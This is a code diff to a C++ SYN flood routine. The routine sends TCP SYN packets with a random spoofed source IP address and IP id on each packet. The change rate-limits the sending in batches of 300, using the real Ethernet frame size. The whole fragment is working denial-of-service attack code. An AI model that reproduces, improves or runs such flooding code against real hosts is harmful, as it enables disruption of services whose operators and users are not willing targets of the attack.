@@ -33,12 +33,12 @@ void SynFlood::syn_flood(IPv4Address dst_ip, uint16_t dst_port, unsigned counter
 
     TCP *tcp = ip.find_pdu<TCP>();
     tcp->set_flag(TCP::SYN, 1);
+    EthernetII eth = EthernetII()/ip;
+    std::chrono::duration<double> time_per_1000_packets((300*eth.size()*8 / (upload_bandwidth*pow(10,6))));
 
-    std::chrono::duration<double> time_per_1000_packets((1000*54*8 / (upload_bandwidth*pow(10,6))));
-
-    for(int i=0; i<counter/1000; i++){
+    for(int i=0; i<counter/300; i++){
         auto start = std::chrono::steady_clock::now();
-        for(int j=0; j<1000; j++) {
+        for(int j=0; j<300; j++) {
             // per ogni syn inviato cambio l'indirizzo ip sorgente e id
             ip.src_addr(random_ip_address());
             ip.id(rand() % 65536);
